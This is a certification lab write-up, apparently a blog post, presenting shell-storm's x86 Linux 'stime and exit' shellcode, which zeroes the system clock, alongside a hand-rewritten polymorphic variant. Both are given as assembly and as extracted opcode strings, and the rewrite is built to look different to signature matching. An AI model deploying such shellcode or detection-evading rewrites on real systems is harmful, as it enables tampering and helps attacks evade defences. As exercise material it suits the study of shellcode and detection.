---
layout: post
title: SLAE Exercise 6 - Polymorphic Shellcode Part 1 Stime
subtitle: Polymorphic Shellcode Part 1
tags: [SLAE]
---

Overview
======

The first chosen shellcode from shell-storm is the 'stime and exit' shellcode. This can be found [here](http://shell-storm.org/shellcode/files/shellcode-213.php). This shellcode sets the device's time to 0, and then gracefully exits. 

The original code can be seen fully commented below:

```
global _start			

section .text
_start:


;stime([0])

push byte 25 ; Push 25 to the stack
pop eax      ; Pop 25 into eax for the stime syscall
cdq          ; Extend eax into edx, clearing the edx register
push edx     ; Push edx to the stack (0)
mov ebx, esp ; Move stack pointer into ebx - the time parameter is pointed to
int 0x80     ; Interupt to syscall

;exit()

inc eax      ; On success, return value from stime is 0, inc to 1 for exit syscall
int 0x80     ; Call interupt to exit gracefully
```

Using various techniques, this code was altered to create a polymorphic version of it. This code can be seen below:

```
global _start			

section .text
_start:

;stime(0)
xor eax, eax  ; clear eax register
push eax      ; push 0 to the stack
add eax, 25   ; add 25 to eax for the stime syscall
xchg ebx, esp ; point to the 0 in the stack
int 0x80      ; interupt to syscall

;exit
inc eax       ; if succesful, return value is 0 to eac, increment eax to be 1 for exit syscall
int 0x80      ; interupt to syscall to exit gracefully
```
It can be clearly seen that the 'stime' section of the code is completely different from before, whilst maintaining a relatively small size. The 'exit' section of the code remains the same, this could be changed with an 'add' or 'mov' instruction, however using the 'inc' instruction maintains a small size. 

When compiled and the extracted, the shellcode appears as follows:

**Original**

```
"\x6a\x19\x58\x99\x52\x89\xe3\xcd\x80\x40\xcd\x80"
```

**Polymorphic**

```
"\x31\xc0\x50\x83\xc0\x19\x87\xdc\xcd\x80\x40\xcd\x80"
```

As can be seen, the polymorphic shellcode, which is nearly completely different, is only one byte larger. 



This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: 1092
